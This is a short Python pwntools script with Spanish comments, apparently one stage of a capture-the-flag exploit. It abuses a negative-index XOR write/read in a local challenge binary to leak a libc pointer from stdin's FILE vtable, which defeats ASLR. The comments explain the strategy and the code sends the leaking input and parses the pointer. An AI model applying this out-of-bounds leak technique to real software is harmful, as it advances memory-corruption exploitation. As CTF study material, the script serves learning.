#!/usr/bin/env python3
"""
Estrategia de leak:

1. stdin tiene punteros a libc y al propio binario
2. Si escribo 0 XOR 0 = 0 en alguna posición de stdin, 
   no cambio nada
3. Luego leo el valor y obtengo un puntero

Pero espera... el programa hace:
- Escribe: result[idx] = A XOR B
- Lee: result[idx]  
- Imprime: "Result: <valor>"

Si uso índice negativo para acceder a stdin, y escribo
0 XOR 0 = 0, entonces no modifico nada y puedo leer
el valor original que había ahí!

Índice -5: stdin+0xd8 (vtable pointer) -> apunta a libc
Índice -31: stdin+0x08 (_IO_read_ptr) -> podría tener algo útil
"""

from pwn import *

context.log_level = 'info'

# Probar leak con índice que apunta a stdin vtable
p = process('./image/challenge/challenge')
p.recvuntil(b'> ')

print("[*] Intentando leak con stdin vtable (índice -5)")
p.sendline(b'0 0 -5')  # 0 XOR 0 = 0, no modifica nada

response = p.recvuntil(b'> ')
print(response.decode())

# Extraer el valor
lines = response.decode().split('\n')
for line in lines:
    if 'Result:' in line:
        value_str = line.split('Result:')[1].strip()
        try:
            value = int(value_str)
            print(f"[+] Valor leído: {value} (0x{value:x})")
            if value > 0x7f0000000000:  # Parece un puntero
                print("[+] ¡Parece un puntero a libc!")
        except:
            print(f"    Valor: {value_str}")

p.close()